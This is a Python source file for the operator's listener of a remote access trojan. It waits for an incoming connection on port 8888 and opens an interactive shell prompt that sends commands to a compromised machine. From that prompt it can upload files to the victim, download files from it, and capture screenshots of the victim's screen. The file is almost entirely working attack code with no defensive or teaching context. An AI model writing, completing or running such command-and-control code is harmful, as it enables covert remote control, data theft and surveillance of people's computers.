import socket
import simplejson
import base64
import colorama
from colorama import Fore, Back, Style
from mss import mss

colorama.init(autoreset=True)

screenshot_count = 1

class Server:
	def __init__(self, ip, port):
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		self.connection.bind((ip, port))
		self.connection.listen(5)
		print(f"{Fore.MAGENTA}{Style.BRIGHT}[+] Listening for incoming connections.{Fore.RESET}{Style.RESET_ALL}")
		self.target, self.address = self.connection.accept()
		print(f"{Fore.YELLOW}{Style.BRIGHT}[+] Connection established from: {Fore.RESET}{Style.RESET_ALL}" + str(self.address))

	def send_json(self, data):
		json_data = simplejson.dumps(data)
		self.target.sendall(json_data.encode("utf-8"))
		if data[0] == "exit":
			self.connection.close()
			exit()

	def receive_json(self):
		res = ""
		while True:
			try:
				res = res + self.target.recv(1024).decode("utf-8")
				return simplejson.loads(res)
			except ValueError:
				continue

	def shell(self):
		global screenshot_count
		global result
		result = ""
		while True:
			command = input(f"{Fore.RED}{Style.BRIGHT}Shell#-{str(self.address)}:{Fore.RESET}{Style.RESET_ALL} ")
			command = command.split(" ")
			try:

				if command[0] == "upload":
					with open(command[1], "rb") as r:
						command.append(base64.b64encode(r.read()))
					result = f"{Fore.GREEN}{Style.BRIGHT}[+] File uploaded.{Fore.RESET}{Style.RESET_ALL}"

				self.send_json(command)
				result = self.receive_json()

				if command[0] == "download":
					with open(command[1], "wb") as w:
						w.write(base64.b64decode(result))
					result = f"{Fore.GREEN}{Style.BRIGHT}[+] Downloaded " + command[1] + f" from specified url.{Fore.RESET}{Style.RESET_ALL}"

				if command[0] == "screenshot":
					with open('screenshot-%d.png' % screenshot_count, 'wb') as screen:
						screen.write(base64.b64decode(result))
						result = ""
						screenshot_count += 1
					result = f"{Fore.GREEN}{Style.BRIGHT}[+] Screenshot taken.{Fore.RESET}{Style.RESET_ALL}"
			except Exception as e:
				print(e)
				result = f"{Fore.BLUE}{Style.BRIGHT}[!] Error!{Fore.RESET}{Style.RESET_ALL}"
			print(f"{Style.BRIGHT}{result}{Style.RESET_ALL}")

server_up = Server("127.0.0.1", 8888)
server_up.shell()
